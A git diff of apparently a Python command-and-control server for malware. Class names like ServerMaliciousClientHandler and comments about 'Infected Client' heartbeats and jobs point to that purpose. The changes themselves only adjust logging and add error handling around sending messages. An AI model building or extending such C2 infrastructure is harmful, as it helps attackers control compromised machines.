@@ -92,7 +92,8 @@ class ServerSockHandler:
             self.ADDR = (ip,port)
             self.server.bind(self.ADDR)  
             atexit.register(self.socket_cleanup)
-            self.server.listen()  
+            self.server.listen()
+            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
 
         ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
         except TimeoutError as e:
@@ -116,17 +117,17 @@ class ServerSockHandler:
         while True:
             ##== Initial  handling of client 
             try:
-                logging.debug(f"Server Listening: {self.ADDR}")
+                #logging.debug(f"Server Listening: {self.ADDR}")
 
                 self.conn, addr = self.server.accept()
 
                 ## Getting client id from the client, and the IP address
                 self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
-                logging.debug(f"Accepted Connection from: {self.client_remote_ip_port}")
+                logging.debug(f"[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")
 
                 ## decode THEN split
                 self.response = bytes_decode(self.conn.recv(1024)).split("\\|/")
-                logging.debug(f"{self.client_remote_ip_port} says: {self.response}")
+                #logging.debug(f"[{self.client_remote_ip_port} -> Server] {self.response}")
                 
                 ##== parsing client response
                 response_list = []
@@ -137,13 +138,13 @@ class ServerSockHandler:
                 response_lisr = []
                 logging.warning(f"Client {self.client_remote_ip_port} disconnected")
 
-            logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")
+            #logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")
 
             try:
                 self.client_type = response_list[0]
                 self.id = response_list[1]
                 self.message = response_list[2]
-                logging.debug(f"Client Established: {self.client_remote_ip_port} id={self.id}")
+                logging.debug(f"[Server] Client Established: {self.client_remote_ip_port} id={self.id}")
 
             except:
                 ## Not setting self.id as it's first in the list, and SHOULD alwys have a value
@@ -204,7 +205,7 @@ class ServerSockHandler:
 
 ##====================================== Construction ===========
             elif self.client_type == "!_client_!":
-                logging.debug(f"Message from Infected Client {self.id} recieved")
+                #logging.debug(f"Message from Infected Client {self.id} recieved")
 
                 ## peername[0] is ip, [1] is port
                 ## Might want to rethink this as it may reach out to cleint again.
@@ -523,7 +524,7 @@ class ServerMaliciousClientHandler:
             self.stats_heartbeats = self.stats_heartbeats + 1
             self.stats_latestcheckin = str(datetime.now(timezone.utc))
             logging.debug(f"[{self.id} -> Server] Heartbeat")
-            logging.debug(f"[server] Current Job: {self.current_job}")
+            logging.debug(f"[Server ({self.id})] Current Job: {self.current_job}")
 
             ## can do if msg == whatever AND this to cleanup
             if self.current_job != None:
@@ -596,8 +597,11 @@ class ServerMaliciousClientHandler:
     def send_msg(self, message):
         #print(f"Message being sent to cleint: {message}") #if global_debug else None
         ##Test >1024
-        self.conn.send(str_encode(message))
+        try:
+            self.conn.send(str_encode(message))
 
+        except Exception as e:
+            logging.debug(f"[Server ({self.id})] Error: {e}")
 ################
 ## QOL Functions
 ################
